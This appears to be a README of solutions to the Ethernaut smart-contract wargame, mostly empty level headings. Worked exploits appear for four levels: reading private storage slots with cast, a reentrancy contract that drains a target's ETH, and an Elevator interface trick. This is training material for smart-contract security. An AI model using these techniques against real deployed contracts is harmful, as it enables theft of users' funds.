# Repo of my attack contracts for Ethernaut

## Notes

### Level 01 - Hello Ethernaut

### Level 02 - Fallback

### Level 03 - Coin Flip

### Level 04 - Telephone

### Level 05 - Token

### Level 06 - Delegation

### Level 07 - Force

### Level 08 - Vault

This level demonstrates that all data on the blockchain is public, even if marked as `private` in Solidity.

**Steps to solve:**

1. **Get the contract's storage data**
   - Get the deployed contract address from Ethernaut
   - Use the `cast storage` command to read the value at storage slot 1 (where the password is stored)

   ```bash
   cast storage 0x7f28d1dABCcCB4d88C305Ed18499aa6A8A1F8AD2 1 --rpc-url $SEPOLIA_RPC_URL
   ```

   Result:
   ```
   0x412076657279207374726f6e67207365637265742070617373776f7264203a29
   ```

2. **Decode the password**
   - Convert the hex value to ASCII to see the actual password

   ```bash
   cast to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
   ```

   Result:
   ```
   A very strong secret password :)
   ```

3. **Unlock the vault**
   - Call the `unlock()` function with the password as parameter

   ```bash
   cast send 0x7f28d1dABCcCB4d88C305Ed18499aa6A8A1F8AD2 "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url $SEPOLIA_RPC_URL
   ```

### Level 10 - Reentrancy
    - The attack exploits a reentrancy vulnerability in the target contract
    - Steps of the attack:
      1. First, we donate ETH to the contract to establish a balance for our attack contract
      2. Then we call withdraw() to start withdrawing our funds
      3. When the target contract sends ETH to our attack contract, it triggers our fallback function
      4. Inside the fallback function, we recursively call withdraw() again before the target contract can update our balance
      5. This creates a loop that drains all funds from the target contract
      6. Once the target contract's balance is less than or equal to our initial donation amount, we withdraw the remaining balance

```solidity
// Key parts of the attack:
function attack() payable public {
    amount = msg.value;
    // First donate to the contract
    CONTRACT.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
    // Then withdraw to trigger the reentrancy
    CONTRACT.call(abi.encodeWithSignature("withdraw(uint256)", amount));
}

fallback() external payable {
    // Recursive call to withdraw() before balance is updated
    if (CONTRACT.balance > amount) {
        CONTRACT.call(abi.encodeWithSignature("withdraw(uint256)", amount));
    }
    else if (CONTRACT.balance <= amount) {
        CONTRACT.call(abi.encodeWithSignature("withdraw(uint256)", CONTRACT.balance));
    }
}
```

### Level 11 - Elevator
    - The attack exploits a trust issue in the Elevator contract which relies on an external interface implementation
    - The Elevator contract calls the `isLastFloor()` function of the caller contract twice, expecting consistent behavior
    - Steps of the attack:
      1. We implement the `isLastFloor()` function in our attack contract with state-changing behavior
      2. On the first call, it returns `false` to make the elevator start moving
      3. On the second call, it returns `true` to make the elevator think it reached the top floor
      4. This exploits the fact that the Elevator contract doesn't verify that the Building interface implementation is trustworthy

```solidity
// Key parts of the attack:
bool booly = false;

function attack(uint256 _floor) public {
    (bool success,) = CONTRACT.call(abi.encodeWithSignature("goTo(uint256)", _floor));
    require(success == true, "Tx reverted!");
}

function isLastFloor(uint256) external returns (bool) {
    if(booly == false) {
        booly = true;
        return false;    
    }
    else {
        return true;
    }
}
```

### Level 12 - Privacy

This level demonstrates that all data on the blockchain is public and accessible, even if variables are marked as `private` in Solidity.

**Steps to solve:**

1. **Understand the storage layout**
   - The contract has a `bytes32[3] private data` array
   - The unlock function requires the first 16 bytes of `data[2]` to unlock the contract
   - Due to Solidity's storage layout, `data[2]` is stored at storage slot 5

2. **Read the storage at slot 5 to get data[2]**
   ```bash
   cast storage 0xd02113fA1907e896939c6FA3fD3dBE7E63060c09 5 --rpc-url $SEPOLIA_RPC_URL
   ```

   Result:
   ```
   0x7b16735bad0f51bc24904d07ac5b2329c297b105c1ba46743e3e30215f48f756
   ```

3. **Extract first 16 bytes and call unlock**
   - The `unlock()` function requires bytes16, which is the first half of the bytes32 value
   - Extract the first 32 characters after 0x: `0x7b16735bad0f51bc24904d07ac5b2329`

   ```bash
   cast send 0xd02113fA1907e896939c6FA3fD3dBE7E63060c09 "unlock(bytes16)" 0x7b16735bad0f51bc24904d07ac5b2329 --rpc-url $SEPOLIA_RPC_URL
   ```

   Verification:
   ```bash
   # Check if locked is now false (0)
   cast storage 0xd02113fA1907e896939c6FA3fD3dBE7E63060c09 0 --rpc-url $SEPOLIA_RPC_URL
   # Result: 0x0000000000000000000000000000000000000000000000000000000000000000
   ```

### Level 13 - Gatekeeper One

### Level 14 - Gatekeeper Two

### Level 15 - Naught Coin

### Level 16 - Preservation

### Level 17 - Recovery

### Level 18 - Magic Number

### Level 19 - Alien Codex

### Level 20 - Denial

### Level 21 - Shop

### Level 22 - Dex

### Level 23 - Dex Two

### Level 24 - Puzzle Wallet

### Level 25 - Motorbike

### Level 26 - DoubleEntryPoint

### Level 27 - Good Samaritan

### Level 28 - Gatekeeper Three

### Level 29 - Switch

### Level 30 - HigherOrder

### Level 31 - Stake

### Level 32 - Impersonator

### Level 33 - Magic Animal Carousel